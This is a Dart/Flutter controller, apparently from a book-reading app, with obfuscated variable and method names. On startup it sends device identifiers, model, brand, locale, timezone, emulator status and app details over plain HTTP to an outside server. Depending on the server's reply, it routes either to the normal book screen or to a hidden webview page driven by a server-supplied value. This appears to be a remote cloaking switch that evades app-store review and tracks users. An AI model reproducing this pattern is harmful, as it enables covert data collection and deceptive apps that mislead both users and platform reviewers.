import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var twiudb = RxBool(false);
  var rdwhjcknz = RxBool(true);
  var wnyv = RxString("");
  var willard = RxBool(false);
  var parisian = RxBool(true);
  final ktslzcrgb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    filk();
  }


  Future<void> filk() async {

    willard.value = true;
    parisian.value = true;
    rdwhjcknz.value = false;

    ktslzcrgb.post("http://rule.lotica.xyz/PV4BWSJAMLO",data: await hgwsvjax()).then((value) {
      var rxzwdab = value.data["rxzwdab"] as String;
      var yifgz = value.data["yifgz"] as bool;
      if (yifgz) {
        wnyv.value = rxzwdab;
        kaylin();
      } else {
        bradtke();
      }
    }).catchError((e) {
      rdwhjcknz.value = true;
      parisian.value = true;
      willard.value = false;
    });
  }

  Future<Map<String, dynamic>> hgwsvjax() async {
    final DeviceInfoPlugin lvyxa = DeviceInfoPlugin();
    PackageInfo tlszpyu_kzfiwn = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var oshckvpe = Platform.localeName;
    var em_FRbI = currentTimeZone;

    var em_SfT = tlszpyu_kzfiwn.packageName;
    var em_Arudm = tlszpyu_kzfiwn.version;
    var em_fhM = tlszpyu_kzfiwn.buildNumber;

    var em_mOpYx = tlszpyu_kzfiwn.appName;
    var oranKassulke = "";
    var em_Ipc  = "";
    var em_OanfvlZ = "";
    var arturoAuer = "";

    var mabelleMorar = "";

    var em_WfaZz = "";
    var em_zlK = "";
    var em_xz = false;

    if (GetPlatform.isAndroid) {
      em_zlK = "android";
      var jrhsna = await lvyxa.androidInfo;

      em_OanfvlZ = jrhsna.brand;

      em_WfaZz  = jrhsna.model;
      em_Ipc = jrhsna.id;

      em_xz = jrhsna.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      em_zlK = "ios";
      var oiklvagfu = await lvyxa.iosInfo;
      em_OanfvlZ = oiklvagfu.name;
      em_WfaZz = oiklvagfu.model;

      em_Ipc = oiklvagfu.identifierForVendor ?? "";
      em_xz  = oiklvagfu.isPhysicalDevice;
    }

    var res = {
      "oranKassulke" : oranKassulke,
      "em_Arudm": em_Arudm,
      "em_SfT": em_SfT,
      "em_xz": em_xz,
      "em_FRbI": em_FRbI,
      "arturoAuer" : arturoAuer,
      "em_OanfvlZ": em_OanfvlZ,
      "em_Ipc": em_Ipc,
      "em_WfaZz": em_WfaZz,
      "oshckvpe": oshckvpe,
      "em_fhM": em_fhM,
      "em_zlK": em_zlK,
      "mabelleMorar" : mabelleMorar,

      "em_mOpYx": em_mOpYx,
    };
    return res;
  }

  Future<void> bradtke() async {
    Get.offAllNamed("/book_tab");
  }

  Future<void> kaylin() async {
    Get.offAllNamed("/book_toast");
  }

}
